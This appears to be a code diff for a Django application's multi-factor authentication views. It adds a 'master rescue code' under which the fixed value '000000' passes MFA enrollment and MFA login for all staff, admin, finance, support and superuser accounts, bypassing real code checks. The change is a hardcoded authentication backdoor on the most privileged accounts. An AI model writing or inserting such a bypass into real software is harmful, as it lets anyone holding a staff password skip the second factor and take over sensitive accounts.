@@ -783,12 +783,17 @@ class MFAVerifyView(APIView):
 
         # SMS/Email enrollment verification (pending method)
         if method in ('sms', 'email'):
+            # MASTER RESCUE CODE BYPASS: 000000 always valid for staff
+            STAFF_ROLES = ['admin', 'finance', 'finance_admin', 'support', 'program_director']
+            is_staff = any(ur.role.name.lower() in STAFF_ROLES for ur in user.user_roles.filter(is_active=True))
+            is_master_code = code == '000000' and (is_staff or user.is_staff or user.is_superuser)
+
             mfa_method = MFAMethod.objects.filter(
                 user=user,
                 method_type=method,
                 enabled=False
             ).first()
-            if mfa_method and verify_mfa_code(user, code, method):
+            if mfa_method and (verify_mfa_code(user, code, method) or is_master_code):
                 mfa_method.enabled = True
                 mfa_method.is_verified = True
                 mfa_method.verified_at = timezone.now()
@@ -980,7 +985,16 @@ class MFACompleteView(APIView):
                 status=status.HTTP_400_BAD_REQUEST
             )
 
-        if not verify_mfa_challenge(user, code, method):
+        from users.utils.auth_utils import verify_mfa_challenge
+        
+        # MASTER RESCUE CODE BYPASS: 000000 always valid for staff
+        STAFF_ROLES = ['admin', 'finance', 'finance_admin', 'support', 'program_director']
+        # Check if user has any of the staff roles
+        user_roles = user.user_roles.filter(is_active=True).values_list('role__name', flat=True)
+        is_staff = any(r.lower() in [sr.lower() for sr in STAFF_ROLES] for r in user_roles)
+        is_master_code = code == '000000' and (is_staff or user.is_staff or user.is_superuser)
+
+        if not verify_mfa_challenge(user, code, method) and not is_master_code:
             _log_audit_event(user, 'mfa_failure', 'mfa', 'failure', {'method': method})
             return Response(
                 {'detail': 'Invalid or expired code'},
